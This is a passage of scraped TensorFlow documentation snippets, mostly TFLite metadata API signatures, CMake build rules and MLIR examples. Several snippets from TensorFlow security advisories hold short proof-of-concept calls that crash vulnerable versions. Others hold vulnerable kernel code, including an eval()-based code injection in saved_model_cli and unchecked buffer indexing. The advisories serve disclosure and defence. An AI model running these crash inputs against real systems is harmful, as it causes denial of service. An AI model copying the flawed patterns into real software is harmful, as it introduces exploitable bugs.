          DataType_Name(static_cast<DataType>(data_type)),
          " is not supported by dlpack");
```

----------------------------------------

TITLE: Initialize ImageSize from Buffer (Deprecated) Python
DESCRIPTION: This deprecated class method performs the same function as GetRootAs, initializing an ImageSize object from a buffer and offset. Users are strongly advised to transition to using the GetRootAs method as this one may be removed in future versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSize.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsImageSize(
    buf, offset=0
)
```

----------------------------------------

TITLE: Building and Pushing Delegate Test Suite for Android (Bash)
DESCRIPTION: Builds the TensorFlow Lite stable delegate test suite executable for Android ARM64 using Bazel and pushes it to a temporary directory on a connected Android device using adb.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_3

LANGUAGE: bash
CODE:
```
bazel build -c opt --config=android_arm64 //tensorflow/lite/delegates/utils/experimental/stable_delegate:stable_delegate_test_suite
adb push "$(bazel info -c opt --config=android_arm64 bazel-bin)"/tensorflow/lite/delegates/utils/experimental/stable_delegate/stable_delegate_test_suite /data/local/tmp
```

----------------------------------------

TITLE: Running All Doctests using Bazel - Bash
DESCRIPTION: Uses Bazel to run the `tf_doctest` build target, which processes and executes all testable code examples found in docstrings across the entire TensorFlow project. This method requires building TensorFlow from source beforehand to ensure the docstrings are tested against the latest code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_15

LANGUAGE: bash
CODE:
```
bazel run //tensorflow/tools/docs:tf_doctest
```

----------------------------------------

TITLE: Initializing NormalizationOptionsT From Buffer Python
DESCRIPTION: Initializes a `NormalizationOptionsT` object by reading data from a flatbuffer buffer (`buf`) starting at a specific position (`pos`). This class method is used to deserialize the object from its binary representation. It requires the raw buffer data and the offset within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Configure Python Environment
DESCRIPTION: Includes CMake logic to detect and configure the Python development environment if the MHLO_ENABLE_BINDINGS_PYTHON option is enabled. This is required for building Python bindings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_13

LANGUAGE: CMake
CODE:
```
#-------------------------------------------------------------------------------
# Python configuration
#-------------------------------------------------------------------------------

if(MHLO_ENABLE_BINDINGS_PYTHON)
  include(MLIRDetectPythonEnv)
  mlir_configure_python_dev_packages()
endif()
```

----------------------------------------

TITLE: Initializing ImageSizeT from Packed Buffer in Python
DESCRIPTION: Class method to initialize an `ImageSizeT` object by reading from a packed FlatBuffers buffer (`buf`). Takes the buffer and an optional starting position (`pos`), which defaults to 0.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod\nInitFromPackedBuf(\n buf, pos=0\n)
```

----------------------------------------

TITLE: Initializing CustomMetadataT From Packed Buffer Python
DESCRIPTION: A class method used to initialize a `CustomMetadataT` object from a potentially packed buffer (`buf`), with an optional starting position (`pos`). This method likely handles deserialization from a specific packed buffer format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Checking for Null SentencePiece Model Python
DESCRIPTION: This instance method checks if the SentencePiece model data field is null or not present in the flatbuffer object. It returns a boolean value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_4

LANGUAGE: python
CODE:
```
SentencePieceModelIsNone()
```

----------------------------------------

TITLE: Declaring Test Python Dependencies (CI)
DESCRIPTION: Lists Python packages necessary for running TensorFlow's test suite in CI. This includes dependencies for networking (grpcio, portpicker), scientific computing (scipy), and JAX-related dependencies, some of which are conditional on the Python version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/devel.requirements.txt#_snippet_2

LANGUAGE: pip requirements
CODE:
```
# Test dependencies
grpcio ~= 1.59.0 # Earliest version for Python 3.12
portpicker ~= 1.6.0
scipy ~= 1.13.0 # Earliest version for NumPy 2.0
# Required for TFLite import from JAX tests
jax ~= 0.4.1; python_version <= '3.11'
jaxlib ~= 0.4.1; python_version <= '3.11' # Earliest version for Python 3.11
```

----------------------------------------

TITLE: Defining a TensorFlow GraphDef Constant Node
DESCRIPTION: This snippet defines a single `Const` node within a TensorFlow computation graph in text format. It specifies the node name ('Empty/shape'), the operation type (`Const`), and its placement on a TPU device. It configures the output tensor's shape (`[2]`), data type (`DT_INT32`), and provides the explicit byte content for the constant tensor. This node is likely used to provide a fixed shape or constant value within the graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/valid_graph.txt#_snippet_0

LANGUAGE: TensorFlow GraphDef Text
CODE:
```
node {
  name: "Empty/shape"
  op: "Const"
  device: "/job:localhost/replica:0/task:0/device:TPU:0"
  attr {
    key: "_output_shapes"
    value {
      list {
        shape {
          dim {
            size: 2
          }
        }
      }
    }
  }
  attr {
    key: "dtype"
    value {
      type: DT_INT32
    }
  }
  attr {
    key: "value"
    value {
      tensor {
        dtype: DT_INT32
        tensor_shape {
          dim {
            size: 2
          }
        }
        tensor_content: "\200\000\000\000\200\000\000\000"
      }
    }
  }
  experimental_debug_info {
  }
}
library {
}
versions {
  producer: 268
}
```

----------------------------------------

TITLE: Build Method Python
DESCRIPTION: Builds the class, used for lazy initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_1

LANGUAGE: python
CODE:
```
build()
```

----------------------------------------

TITLE: Testing TensorFlow Custom Op SavedModel Python
DESCRIPTION: Tests the compatibility of the custom `multiplex_4_op` with TensorFlow's SavedModel feature. This involves saving a model using the op via `model_using_multiplex.save` and then loading and using it with `model_using_multiplex.load_and_use`, verifying the output to ensure proper serialization and deserialization. Requires TensorFlow, the custom op, and the `model_using_multiplex` utility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_6

LANGUAGE: Python
CODE:
```
  def test_multiplex_saved_model(self):
    path = os.path.join(self.create_tempdir(), 'model')
    model_using_multiplex.save(multiplex_4_op.multiplex, path)
    result = model_using_multiplex.load_and_use(path)
    self.assertAllEqual(result, tf.constant([1, 20, 3, 40, 5], dtype=tf.int64))
```

----------------------------------------

TITLE: Reproducing RaggedRangeOp Integer Overflow - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the integer overflow vulnerability in `tf.raw_ops.RaggedRange`. It calls the operation with the `limits` argument containing a very large float value (`1e20`), which triggers the overflow upon conversion to `int64`, resulting in a program crash in vulnerable TensorFlow versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-090.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.RaggedRange(starts=[1.1,0.1],limits=[10.0,1e20],deltas=[1,1])
```

----------------------------------------

TITLE: Defining and Configuring CMake Library Target
DESCRIPTION: Defines the `farmhash` library target using `add_library`, specifies its source files, sets public header properties, and configures include directories for both build and install interfaces.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/farmhash/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_library(farmhash
  "${FARMHASH_SOURCE_DIR}/src/farmhash.cc"
  "${FARMHASH_SOURCE_DIR}/src/farmhash.h"
)
set_target_properties(farmhash PROPERTIES PUBLIC_HEADER "${FARMHASH_SOURCE_DIR}/src/farmhash.h")
target_include_directories(farmhash PUBLIC $<BUILD_INTERFACE:${FARMHASH_SOURCE_DIR}/src> $<INSTALL_INTERFACE:${CMAKE_INSTALL_INCLUDEDIR}>)
```

----------------------------------------

TITLE: Ending Image Properties Configuration in TFLite Support - Python
DESCRIPTION: This snippet shows the function signature for `ImagePropertiesEnd` in Python. This function is typically used within the TFLite Support library's metadata generation process to finalize the configuration of image properties after defining all the required attributes. It takes a FlatBuffer builder object as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesEnd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ImagePropertiesEnd(
    builder
)
```

----------------------------------------

TITLE: Calling TFLite ModelMetadataAddSubgraphMetadata Python
DESCRIPTION: Shows the signature for the `ModelMetadataAddSubgraphMetadata` function. This function is called to add a previously created subgraph metadata object to the main model metadata builder object. It requires the builder and the subgraph metadata object as parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddSubgraphMetadata.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddSubgraphMetadata(
    builder, subgraphMetadata
)
```

----------------------------------------

TITLE: MLIR Test Case for Reduction Strategy (MLIR)
DESCRIPTION: Provides an example of an MLIR test file used to verify a custom reduction strategy implementation. The `// RUN:` comment specifies the command to execute (`mlir-bisect` with the `--debug-strategy` flag), and the `// CHECK:` comments assert that the expected output patterns (representing the modified candidates generated by the strategy) are present in the tool's debug output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_bisect/README.md#_snippet_4

LANGUAGE: mlir
CODE:
```
// RUN: mlir-bisect %s --debug-strategy=FrobulateAndDefenestrate | FileCheck %s

func.func @main() {
  dialect.some_op()
}

// CHECK: func @main()
// CHECK-NEXT: frobulated

// CHECK: func @main()
// CHECK-NEXT: defenestrated
```

----------------------------------------

TITLE: Lowering tfl.average_pool_2d (Non-Quantized) to TOSA MLIR
DESCRIPTION: Documents the lowering of the non-quantized TensorFlow Lite `tfl.average_pool_2d` operation to the TOSA dialect's `tosa.AVG_POOL2D`. It includes kernel size, stride, padding attributes and optional handling for fused activation functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_54

LANGUAGE: MLIR
CODE:
```
%output = tfl.average_pool_2d(%input) {filter_height, filter_width, padding, stride_h, stride_w, fused_activation_function}
```

LANGUAGE: MLIR
CODE:
```
%avgpool2d = tosa.AVG_POOL2D(%input) {kernel={filter_height, filter_width}, stride={stride_h, stride_w}, padding=tosa_padding}
if(fused_activation != NONE) {
    %result = convert_fused_activation(%avgpool2d, fused_activation)
}
else {
    %result = %avgpool2d
}
```

----------------------------------------

TITLE: Adding Main MLIR-HLO LIT Test Suite (CMake)
DESCRIPTION: Adds a LIT test suite target named 'check-mlir-hlo-lit'. This target represents the main regression tests for MLIR-HLO, specifying its source directory and dependencies on the tools listed in MLIR_HLO_TEST_DEPENDS.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
add_lit_testsuite(check-mlir-hlo-lit "Running the mlir-hlo regression tests"
        ${CMAKE_CURRENT_BINARY_DIR}
        DEPENDS ${MLIR_HLO_TEST_DEPENDS}
        )
```

----------------------------------------

TITLE: Declare MLIR HLO Python Extensions Group
DESCRIPTION: This command declares a separate group for MLIR HLO Python extensions. This group will hold the sources for specific compiled C++ extensions that provide functionality to the Python bindings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
declare_mlir_python_sources(MLIRHLOPythonExtensions)
```

----------------------------------------

TITLE: Processing saved_model_cli Input Expressions Python
DESCRIPTION: This Python function snippet from `saved_model_cli.py` demonstrates how user-supplied input expressions (`input_exprs_str`) are parsed. It splits the string by semicolons and then uses `eval()` on each resulting expression to convert the string representation into a Python object, which poses a code injection vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-167.md#_snippet_0

LANGUAGE: python
CODE:
```
def preprocess_input_exprs_arg_string(input_exprs_str):
  ...
  for input_raw in filter(bool, input_exprs_str.split(';')):
    ...
    input_key, expr = input_raw.split('=', 1)
    input_dict[input_key] = eval(expr)
  ...
```

----------------------------------------

TITLE: Triggering FPE in TensorFlow UnravelIndex (Python)
DESCRIPTION: This Python snippet demonstrates a division by zero vulnerability in `tf.raw_ops.UnravelIndex`. By providing a `dims` argument that includes a zero dimension (e.g., `[1, 0, 2]`), the operation attempts division by zero during index calculation, leading to a floating-point exception and denial of service. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-142.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.UnravelIndex(indices=-1, dims=[1,0,2])
```

----------------------------------------

TITLE: Checking CluRequest Equality Python Method
DESCRIPTION: This snippet presents the signature for the `__eq__` method of the `CluRequest` class. This method is used to compare the current `CluRequest` object with another object (`other`) for equality, returning `True` if they are equal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/CluRequest.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Initializing TensorGroupT from Buffer Python
DESCRIPTION: A class method used to initialize a `TensorGroupT` object from a given data buffer at a specified position. This method is useful for deserializing data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Vulnerable Broadcasting Indexing in TFLite C++
DESCRIPTION: This C++ snippet shows the core broadcasting loop in the TFLite Minimum/Maximum operator implementation. It uses a single index array `indexes` to access data from both input tensors (`desc1`, `desc2`) and the output tensor (`output_desc`). The vulnerability occurs here because there is no explicit check to ensure that `indexes` is within the bounds of both `desc1` and `desc2` before accessing `input1_data` and `input2_data`, leading to out-of-bounds reads when an input tensor is empty.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-078.md#_snippet_0

LANGUAGE: C++
CODE:
```
auto maxmin_func = [&](int indexes[N]) {
  output_data[SubscriptToIndex(output_desc, indexes)] =
    op(input1_data[SubscriptToIndex(desc1, indexes)],
        input2_data[SubscriptToIndex(desc2, indexes)]);
};
```

----------------------------------------

TITLE: Adding Vocabulary File Offset to Regex Tokenizer Options (Python)
DESCRIPTION: This Python function, likely generated as part of the FlatBuffers schema code for TFLite metadata, is used to associate a vocabulary file with the Regex Tokenizer options. It takes a FlatBuffers builder instance and the offset of the vocabulary file string within the buffer as input. This function is crucial for correctly serializing the tokenizer configuration into the model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsAddVocabFile.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.RegexTokenizerOptionsAddVocabFile(
    builder, vocabFile
)
```

----------------------------------------

TITLE: Lowering tfl.batch_to_space_nd to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow Lite `tfl.batch_to_space_nd` operation, which moves batch data into spatial dimensions, to the TOSA dialect's `convert_batch_to_space_nd_op`. It takes input, block shape, and indices.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_56

LANGUAGE: MLIR
CODE:
```
%output = tfl.batch_to_space_nd(%input, %block_shape, %indices)
```

LANGUAGE: MLIR
CODE:
```
%result = convert_batch_to_space_nd_op(%input, %block_shape, %indices)
```

----------------------------------------

TITLE: Accessing Input Pointers in Interpolation Function - C++
DESCRIPTION: This C++ snippet is from the interpolation function (`quantized_resize_bilinear_op.cc`) within the `QuantizedResizeBilinear` kernel. It shows the loop where the input pointers (`ys_input_lower_ptr`) are accessed using the index `xs_lower + c`, where `xs_lower` is derived from the potentially invalid `interpolation->lower[x]`. When `xs_lower` is out of bounds due to the flaw in bound calculation, this memory access results in the heap buffer overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-019.md#_snippet_2

LANGUAGE: cpp
CODE:
```
template <int RESOLUTION, typename T, typename T_SCALE, typename T_CALC>
inline void OutputLerpForChannels(const InterpolationCache<T_SCALE>& xs,
                                  const int64 x, const T_SCALE ys_ilerp,
                                  const int channels, const float min,
                                  const float max, const T* ys_input_lower_ptr,
                                  const T* ys_input_upper_ptr,
                                  T* output_y_ptr) {
  const int64 xs_lower = xs.lower[x];
  ...
  for (int c = 0; c < channels; ++c) {
    const T top_left = ys_input_lower_ptr[xs_lower + c];
    ...
  }
}
```

----------------------------------------

TITLE: Problematic Pool3dParameters Initialization (C++)
DESCRIPTION: This C++ snippet from the TensorFlow kernel code shows the critical line where `Pool3dParameters` is initialized. The vulnerability occurs because the code proceeds without checking if the initialization, which uses `OP_REQUIRES` for validation, successfully completed. A failed `OP_REQUIRES` inside the constructor leaves `params` in an invalid state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-064.md#_snippet_1

LANGUAGE: cpp
CODE:
```
Pool3dParameters params{context,  ksize_,       stride_,
                        padding_, data_format_, tensor_in.shape()};
```

----------------------------------------

TITLE: Demonstrating Null Pointer Dereference in TensorFlow Restore Python
DESCRIPTION: This Python snippet demonstrates a null pointer dereference vulnerability in `tf.raw_ops.Restore`. Providing an empty list `[]` for the `tensor_name` argument triggers the issue when TensorFlow attempts to access a non-existent list element during restoration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-113.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=[],
  default_value=21,
  dt=tf.int,
  preferred_shard=1)
```

----------------------------------------

TITLE: Adding Process Units to Tensor Metadata (Python)
DESCRIPTION: This Python function adds a list of processing units (`processUnits`) to tensor metadata using the provided FlatBuffer `builder`. It's typically used during the construction of TFLite model metadata to specify preprocessing or postprocessing steps associated with a tensor. The `builder` is a FlatBuffer builder instance, and `processUnits` is likely an offset to a FlatBuffer vector of process unit objects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataAddProcessUnits.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataAddProcessUnits(
    builder, processUnits
)
```

----------------------------------------

TITLE: Initializing AssociatedFileT From Object Python
DESCRIPTION: A class method to initialize an `AssociatedFileT` object from an existing `associatedFile` object. This might be used for copying or converting between object representations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    associatedFile
)
```

----------------------------------------

TITLE: Generating HLO Patterns Code using TableGen
DESCRIPTION: These commands configure and invoke `mlir_tablegen` to process `hlo_patterns.td`, generating C++ code (`hlo_patterns.cc.inc`) specifically for HLO operation rewrite patterns.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_3

LANGUAGE: cmake
CODE:
```
set(LLVM_TARGET_DEFINITIONS hlo_patterns.td)
mlir_tablegen(hlo_patterns.cc.inc -gen-rewriters)
add_public_tablegen_target(MLIRMhloRewriterIncGen)
```

----------------------------------------

TITLE: Defining Pad Operation in MLIR HLO
DESCRIPTION: Defines an XLA Pad operation on a 2D floating-point parameter (`p0`) using a scalar pad value (`p1`) and a specific padding configuration `1_4_1x4_8_0`. The padding config specifies low, high, and interior padding for each dimension.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_6

LANGUAGE: MLIR HLO
CODE:
```
p0 = f32[4, 4] parameter(0)
p1 = f32[] parameter(1)
pad = f32[12, 16] pad(p0, p1), padding=1_4_1x4_8_0
```

----------------------------------------

TITLE: Registering DepthwiseConv2D Kernel (Original C++)
DESCRIPTION: This snippet shows the original C++ code registering the `DepthwiseConv2D` kernel using `AddBuiltin`. Without specifying `min_version` and `max_version`, it defaults to registering the kernel for version 1 only.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_7

LANGUAGE: C++
CODE:
```
AddBuiltin(BuiltinOperator_DEPTHWISE_CONV_2D, Register_DEPTHWISE_CONV_2D());
```

----------------------------------------

TITLE: Reproducing String to tf.float16 Segfault in TensorFlow Python
DESCRIPTION: This snippet demonstrates the specific operation that triggers the segmentation fault vulnerability (TFSA-2020-001) in vulnerable TensorFlow versions when eager execution is enabled. It attempts to create a constant tensor of type `tf.float16` from a Python string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-001.md#_snippet_0

LANGUAGE: Python
CODE:
```
tf.constant("hello", tf.float16)
```

----------------------------------------

TITLE: Listing MLIR TF to StableHLO APIs (C++)
DESCRIPTION: This snippet lists C++ symbols for converting TensorFlow models to StableHLO format using MLIR, exposed by the `//tensorflow/compiler/mlir/tensorflow_to_stablehlo/python:pywrap_tensorflow_to_stablehlo_lib_impl` build target. It includes Python wrapper functions for converting SavedModels and TF Modules.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_9

LANGUAGE: C++
CODE:
```
mlir::tensorflow_to_stablehlo::pywrap::PywrapSavedModelToStablehlo
```

LANGUAGE: C++
CODE:
```
mlir::tensorflow_to_stablehlo::pywrap::PywrapTfModuleToStablehlo
```

----------------------------------------

TITLE: Demonstrating TFSA-2021-041 Vulnerability in UnsortedSegmentJoin (Python)
DESCRIPTION: This Python code snippet demonstrates the denial of service vulnerability in TensorFlow prior to the patch. Calling `tf.raw_ops.UnsortedSegmentJoin` with an empty `num_segments` tensor causes a `CHECK`-failure and program termination.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-041.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

inputs = tf.constant([], dtype=tf.string)
segment_ids = tf.constant([], dtype=tf.int32)
num_segments = tf.constant([], dtype=tf.int32)
separator = ''

tf.raw_ops.UnsortedSegmentJoin(
  inputs=inputs, segment_ids=segment_ids,
  num_segments=num_segments, separator=separator)
```

----------------------------------------

TITLE: Demonstrating QuantizeAndDequantizeV3 Vulnerability in Python
DESCRIPTION: This Python proof-of-concept snippet demonstrates how a negative `axis` value (-100) can trigger a heap out-of-bounds read vulnerability in the `tf.raw_ops.QuantizeAndDequantizeV3` operation within a TensorFlow function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-185.md#_snippet_2

LANGUAGE: Python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV3(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    narrow_range=False,
    axis=-100)
  return data

test()
```

----------------------------------------

TITLE: Calculating Maximum Rank and Initializing Dimensions Vector (C++)
DESCRIPTION: This C++ snippet from `simplifyBroadcast` calculates the maximum rank across a set of input shapes and initializes a `SmallVector` of symbolic dimensions based on this maximum rank. The vulnerability arises because if all input shapes are scalar, `maxRank` becomes 0, resulting in an empty `joined_dimensions` vector, which can lead to a segfault later.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-058.md#_snippet_0

LANGUAGE: C++
CODE:
```
  size_t maxRank = 0;
  for (auto shape : llvm::enumerate(shapes)) {
    auto found_shape = analysis.dimensionsForShapeTensor(shape.value());
    if (!found_shape) return {};
    shapes_found.push_back(*found_shape);
    maxRank = std::max(maxRank, found_shape->size());
  }


  SmallVector<const ShapeComponentAnalysis::SymbolicDimension*>
      joined_dimensions(maxRank);
```

----------------------------------------

TITLE: Internal Calculation Logic in tf.histogram_fixed_width Kernel C++
DESCRIPTION: This C++ snippet from the TensorFlow kernel implementation shows the calculation logic used to determine the bin index for each value. The vulnerability occurs here because the `cwiseMax` and division operations with NaN produce NaN, which then causes a crash when cast to `int32`, as floating-point exceptions are not handled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-080.md#_snippet_1

LANGUAGE: c++
CODE:
```
index_to_bin.device(d) =
    ((values.cwiseMax(value_range(0)) - values.constant(value_range(0)))
         .template cast<double>() /
     step)
        .cwiseMin(nbins_minus_1)
        .template cast<int32>();
```

----------------------------------------

TITLE: Demonstrating TensorFlow TensorListReserve Vulnerability - Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the vulnerability in `tf.raw_ops.TensorListReserve` by providing a negative value (-1) for the `num_elements` argument. Executing this code on vulnerable versions of TensorFlow will cause the process to abort due to an invalid memory allocation attempt.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-117.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.TensorListReserve(
  element_shape = tf.constant([1]),
  num_elements=tf.constant([-1]),
  element_dtype = tf.int32)
```

----------------------------------------

TITLE: Get Description - TensorMetadata (Python)
DESCRIPTION: Retrieves the textual description of the tensor. This provides a human-readable explanation of the tensor's purpose or data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_4

LANGUAGE: python
CODE:
```
Description()
```

----------------------------------------

TITLE: Enabling Testing and Adding Definitions (CMake)
DESCRIPTION: Enables testing support for the project, which is necessary for CMake's test discovery and execution features (like ctest). It also adds a preprocessor definition `TF_PIP_INTEGRATION_TEST` to the compilation flags for all targets, which may be used for conditional compilation in the source code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
enable_testing()
add_definitions(-DTF_PIP_INTEGRATION_TEST)
```

----------------------------------------

TITLE: Accessing Content Range Python
DESCRIPTION: Retrieves the range information associated with the Content object. This could refer to data ranges, value ranges, or other quantifiable aspects of the content metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Content.md#_snippet_6

LANGUAGE: python
CODE:
```
Range()
```

----------------------------------------

TITLE: Creating Java Task API Factory Method
DESCRIPTION: This Java snippet demonstrates the implementation of a static factory method (`createBertQuestionAnswerer`) that takes Android `Context` and file paths. It uses `TaskJniUtils` to load the JNI library, process model files, and call a native initialization method (`initJniWithBertByteBuffers`) which returns the native C++ object handle. The constructor uses this handle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_6

LANGUAGE: java
CODE:
```
      class BertQuestionAnswerer extends BaseTaskApi {
        private static final String BERT_QUESTION_ANSWERER_NATIVE_LIBNAME =
                                                  "bert_question_answerer_jni";

        // Extending super constructor by providing the
        // native handle(pointer of corresponding C++ API object)
        private BertQuestionAnswerer(long nativeHandle) {
          super(nativeHandle);
        }

        public static BertQuestionAnswerer createBertQuestionAnswerer(
                                            Context context, // Accessing Android files
                                            String pathToModel, String pathToVocab) {
          return new BertQuestionAnswerer(
              // The util first try loads the JNI module with name
              // BERT_QUESTION_ANSWERER_NATIVE_LIBNAME, then opens two files,
              // converts them into ByteBuffer, finally ::initJniWithBertByteBuffers
              // is called with the buffer for a C++ API object pointer
              TaskJniUtils.createHandleWithMultipleAssetFilesFromLibrary(
                  context,
                  BertQuestionAnswerer::initJniWithBertByteBuffers,
                  BERT_QUESTION_ANSWERER_NATIVE_LIBNAME,
                  pathToModel,
                  pathToVocab));
        }

        // modelBuffers[0] is tflite model file buffer, and modelBuffers[1] is vocab file buffer.
        // returns C++ API object pointer casted to long
        private static native long initJniWithBertByteBuffers(ByteBuffer... modelBuffers);

      }
```

----------------------------------------

TITLE: Defining OP_REQUIRES Macro in TensorFlow (C++)
DESCRIPTION: This C++ snippet provides the definition of the `OP_REQUIRES` macro used within TensorFlow kernels for input validation. It shows that if the condition `EXP` is false, the macro logs a failure and performs a `return;`, which exits the current function but not necessarily the calling function, explaining why the vulnerability occurs when `ValidateInputs` returns early.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-018.md#_snippet_3

LANGUAGE: C++
CODE:
```
#define OP_REQUIRES(CTX, EXP, STATUS)                     \
